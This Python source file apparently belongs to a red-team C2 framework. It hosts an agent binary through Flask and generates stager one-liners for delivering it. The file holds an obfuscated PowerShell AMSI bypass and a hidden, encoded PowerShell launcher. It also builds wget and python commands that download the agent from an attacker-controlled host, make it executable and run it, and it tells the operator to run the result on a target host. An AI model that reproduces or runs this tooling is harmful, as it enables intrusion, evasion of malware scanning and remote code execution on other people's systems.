import shutil
from flask import *
import string
import random
import base64
import sys
from utils.colors import *
from os import getcwd
from utils.inputs import *

cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
app = Flask(__name__)

DOWNLOAD_DIRECTORY = getcwd() + "/utils/www"


def randomize_str() -> str:
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=8))


def copy_agent(os, build, uri):
    web_dir = "/OffensiveNotion/utils/www/{}".format(uri)
    print(info + "Copying agent")
    if os == "windows":
        agent_name = "offensive_notion.exe"
    else:
        agent_name = "offensive_notion"
    try:
        shutil.move("/out/{}".format(agent_name), web_dir)
    except Exception as e:
        print(printError + str(e))
        exit(1)


def generate_payload(method, host, port, uri):
    print(info + "Generating payload")
    srv_host = host
    srv_port = port
    srv_uri = uri
    random_str = randomize_str()

    if method == "powershell":
        amsi_primitive = input(important +"Enter your favorite AMSI bypass. Leave blank for a default > ")
        if amsi_primitive == "":
            amsi_primitive = r"""$QfltGMfi=$null;$gtqdf="$([CHAr]([ByTE]0x53)+[ChaR](121+82-82)+[ChaR](115)+[cHaR](116+51-51)+[CHaR](44+57)+[cHaR]([byTe]0x6d)).$([CHaR]([BYtE]0x4d)+[chAr](97*90/90)+[chAR](110*15/15)+[ChAR]([bYTE]0x61)+[CHar]([BYTE]0x67)+[chaR](101)+[char]([BYtE]0x6d)+[CHar]([bYTE]0x65)+[CHar]([bYTE]0x6e)+[chAR]([byTe]0x74)).$([ChAr]([BytE]0x41)+[cHAR]([bytE]0x75)+[chAR]([byTE]0x74)+[ChaR]([BYTE]0x6f)+[chaR](20+89)+[cHAR](97+91-91)+[CHAR]([BYTE]0x74)+[ChAr]([bYte]0x69)+[chAR]([ByTE]0x6f)+[ChaR](110+100-100)).$([cHAR]([byte]0x41)+[ChAR]([byTE]0x6d)+[ChAr]([byTE]0x73)+[CHar]([BytE]0x69)+[chAR]([Byte]0x55)+[ChAr](116+5-5)+[ChAr]([bYTE]0x69)+[chaR](98+10)+[cHar]([BYTE]0x73))";$hhjt="+[chAr]([byte]0x6e)+[ChaR]([bYte]0x6f)+[ChAR]([byTE]0x70)+[cHAr]([byte]0x70)+[CHAr](114*14/14)+[CHaR](107)+[cHAR]([bYtE]0x75)+[char]([byte]0x6c)";[Threading.Thread]::Sleep(1187);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($([chaR]([bytE]0x53)+[CHar](121)+[cHar](115*38/38)+[CHaR]([Byte]0x74)+[Char]([ByTE]0x65)+[CHar]([BYTE]0x6d)+[chAr]([byTE]0x2e)+[cHAr](82*76/76)+[ChaR]([bYte]0x65)+[cHAR]([ByTe]0x66)+[Char](20+88)+[ChaR]([bYtE]0x65)+[ChaR](90+9)+[Char](116*93/93)+[ChaR](105*26/26)+[cHar]([byte]0x6f)+[cHAR]([bYTe]0x6e)+[cHAr]([bYTE]0x2e)+[chAR]([BYTe]0x42)+[CHAR]([byTE]0x69)+[chAR](110)+[cHaR]([bYTe]0x64)+[char](105*73/73)+[CHar](42+68)+[ChAr](103+65-65)+[ChAR](25+45)+[cHAr](108)+[char](97*82/82)+[cHaR](103*89/89)+[CHAR]([BYte]0x73)))).FullName), $([CHAr]([ByTE]0x53)+[ChaR](121+82-82)+[ChaR](115)+[cHaR](116+51-51)+[CHaR](44+57)+[cHaR]([byTe]0x6d)).Reflection.FieldInfo]" -as [String].Assembly.GetType($([ChAR](83+39-39)+[chAr](91+30)+[CHAR]([byTE]0x73)+[chaR](72+44)+[cHAR](101)+[CHAR]([bYTE]0x6d)+[cHar]([bYTe]0x2e)+[chAR]([byTE]0x54)+[ChaR]([byTE]0x79)+[chAR]([BytE]0x70)+[cHaR](101+79-79)))), [Object]([Ref].Assembly.GetType($gtqdf)),($([ChaR]([byte]0x47)+[ChAr](101+96-96)+[CHaR]([byTE]0x74)+[cHar]([bytE]0x46)+[cHAR]([ByTE]0x69)+[chAR]([bYTE]0x65)+[CHAr]([bYTE]0x6c)+[ChAr](100)))).Invoke($([cHaR]([BytE]0x61)+[ChAR]([bYte]0x6d)+[cHaR](97+18)+[ChAr](105*46/46)+[char](10+63)+[CHAR](49+61)+[cHAR](4+101)+[char]([BYTe]0x74)+[cHAR]([bytE]0x46)+[cHAr](97*19/19)+[chaR]([bYtE]0x69)+[char](108*10/10)+[char]([BYTe]0x65)+[ChAR](100)),(("NonPublic,Static") -as [String].Assembly.GetType($([chaR]([bytE]0x53)+[CHar](121)+[cHar](115*38/38)+[CHaR]([Byte]0x74)+[Char]([ByTE]0x65)+[CHar]([BYTE]0x6d)+[chAr]([byTE]0x2e)+[cHAr](82*76/76)+[ChaR]([bYte]0x65)+[cHAR]([ByTe]0x66)+[Char](20+88)+[ChaR]([bYtE]0x65)+[ChaR](90+9)+[Char](116*93/93)+[ChaR](105*26/26)+[cHar]([byte]0x6f)+[cHAR]([bYTe]0x6e)+[cHAr]([bYTE]0x2e)+[chAR]([BYTe]0x42)+[CHAR]([byTE]0x69)+[chAR](110)+[cHaR]([bYTe]0x64)+[char](105*73/73)+[CHar](42+68)+[ChAr](103+65-65)+[ChAR](25+45)+[cHAr](108)+[char](97*82/82)+[cHaR](103*89/89)+[CHAR]([BYte]0x73))))).SetValue($QfltGMfi,$True);"""
        cmd_primitive = "powershell.exe -nop -w hidden -ep bypass -e "

        payload_primitive = "IWR  http://{}:{}/{} -Outfile {}; Start-Process -FilePath .\{} -Wait -NoNewWindow".format(
            srv_host, srv_port, srv_uri, random_str, random_str)
        amsi_encoded = amsi_primitive.encode('UTF-16LE')
        payload_encoded = payload_primitive.encode('UTF-16LE')
        encoded = base64.b64encode(amsi_encoded + payload_encoded)
        decoded = encoded.decode('ascii')
        one_liner = cmd_primitive + str(decoded)

    elif method == "wget-linux":
        one_liner = "wget -qO {random_str} --no-check-certificate http://{host}:{port}/{uri}; chmod +x {random_str}; ./{random_str}& disown".format(
            random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)

    elif method == "wget-psh":
        one_liner = "wget http://{host}:{port}/{uri} -usebasicparsing -o {random_str};  Start-Process -FilePath .\{random_str} -Wait -NoNewWindow".format(
            random_str=random_str, host=srv_host, port=srv_port, uri=srv_uri)

    elif method == "python-linux":
        cmd_primitive = "python3 -c "
        payload_primitive = r'import urllib.request; import os; import stat; url = "http://{host}:{port}/{uri}"; filename = "/tmp/{random_str}"; urllib.request.urlretrieve(url, filename); st = os.stat(filename); os.chmod(filename, st.st_mode | stat.S_IEXEC);os.system(filename)'.format(host=srv_host, port=srv_port, uri=srv_uri, random_str=random_str)
        one_liner = cmd_primitive + "'" + payload_primitive + "'"

    elif method == "python-windows":
        cmd_primitive = "python -c "
        payload_primitive = 'import urllib.request; import os; url = \'http://{host}:{port}/{uri}\'; filename = \'notion.exe\'; urllib.request.urlretrieve(url, filename); os.system(filename)'.format(host=srv_host, port=srv_port, uri=srv_uri, random_str=random_str)
        one_liner = cmd_primitive + "\"" + payload_primitive + "\""
    return one_liner


@app.route("/<path:path>")
def get_file(path):
    """Download a file."""
    return send_from_directory(DOWNLOAD_DIRECTORY, path, as_attachment=True)


def main(host, port, method, os, build):
    uri = randomize_str()
    copy_agent(os, build, uri)
    one_liner = generate_payload(method, host, port, uri)
    print("\n" + important + "Run this on the target host:\n" + Fore.YELLOW + one_liner + Fore.RESET + "\n")
    app.run(host="0.0.0.0", port=port)
